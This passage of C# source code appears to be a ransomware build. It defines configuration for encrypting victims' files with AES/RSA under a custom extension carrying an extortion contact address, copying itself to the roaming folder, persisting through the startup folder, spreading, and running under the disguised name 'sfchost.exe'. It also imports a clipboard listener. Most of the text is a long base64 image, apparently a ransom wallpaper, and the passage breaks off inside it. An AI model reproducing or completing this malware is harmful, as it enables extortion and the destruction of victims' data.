using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "59spkwhx7eyc6p3lmaf472";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "poop69news@gmailcom";

	private static bool checkSpread = false;

	private static string spreadName = "surprise";

	private static bool checkCopyRoaming = true;

	private static string processName = "sfchost.exe";

	public static string appMutexRun2 = "L1v1y5gq751piPGGHNs";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = true;

	private static int sleepTextbox = 1;

	private static string base64Image = "/9j/4AAQSkZJRgABAQAAAQABAAD/4gHYSUNDX1BST0ZJTEUAAQEAAAHIAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAACRyWFlaAAABFAAAABRnWFlaAAABKAAAABRiWFlaAAABPAAAABR3dHB0AAABUAAAABRyVFJDAAABZAAAAChnVFJDAAABZAAAAChiVFJDAAABZAAAAChjcHJ0AAABjAAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAAgAAAAcAHMAUgBHAEJYWVogAAAAAAAAb6IAADj1AAADkFhZWiAAAAAAAABimQAAt4UAABjaWFlaIAAAAAAAACSgAAAPhAAAts9YWVogAAAAAAAA9tYAAQAAAADTLXBhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABtbHVjAAAAAAAAAAEAAAAMZW5VUwAAACAAAAAcAEcAbwBvAGcAbABlACAASQBuAGMALgAgADIAMAAxADb/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wAARCAHgAqADAREAAhEBAxEB/8QAHgABAAIDAQADAQAAAAAAAAAAAAcIBQYJBAIDCgH/xAApEAEAAgIDAQEAAQUAAgMBAAAABQYEBwIDCAEJFRETFBYXEhkYISQm/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AP38AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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